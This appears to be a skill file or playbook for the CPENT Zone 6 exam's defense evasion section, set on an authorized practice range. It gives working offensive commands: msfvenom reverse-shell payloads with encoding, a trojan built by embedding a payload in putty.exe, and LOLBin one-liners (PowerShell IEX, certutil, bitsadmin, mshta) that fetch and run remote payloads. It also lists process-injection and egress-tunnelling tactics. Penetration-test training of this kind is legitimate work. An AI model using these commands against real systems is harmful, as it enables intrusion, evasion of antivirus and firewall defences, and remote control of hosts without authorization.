---
name: defense-evasion
description: Defense evasion playbook for CPENT Zone 6 — payload obfuscation/encoding, LOLBins, process injection, and firewall/egress evasion. Use when AV/EDR or firewall rules block standard tools or shells on the authorized range.
---

# Defense Evasion (Zone 6, 10%)

Tested standalone and as a requirement inside other ranges — when a standard payload or tool
gets blocked on the range, switch tactics rather than giving up.

## When a reverse shell gets caught, change one variable

- **Port:** move to 443 or 53 (commonly allowed egress).
- **Protocol:** HTTPS or DNS tunnel instead of raw TCP.
- **Execution:** a LOLBin instead of dropping a binary.
- **Direction:** if egress is filtered, try a bind shell on an allowed inbound port.

## Payload obfuscation / encoding

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<p> \
  -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
msfvenom ... -x putty.exe -f exe -o trojan.exe        # embed in a legit binary
# or XOR-encode shellcode with a key and decode at runtime
```

## LOLBins (built-in Windows, avoids dropping tools)

```
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/s.ps1')"
certutil -urlcache -split -f http://<ip>/payload.exe payload.exe
bitsadmin /transfer job http://<ip>/payload.exe C:\temp\payload.exe
mshta http://<ip>/payload.hta
# rundll32 / regsvr32 / wmic for execution
```

## Process injection & egress tunnels

- Migrate to a legit process after initial shell (meterpreter `migrate`), or
  CreateRemoteThread/DLL injection manually.
- Tunnel over HTTP(S): **chisel**, **stunnel**. Covert DNS: **dnscat2**.

Document the detection you hit and the evasion that worked — that's the gradeable skill.
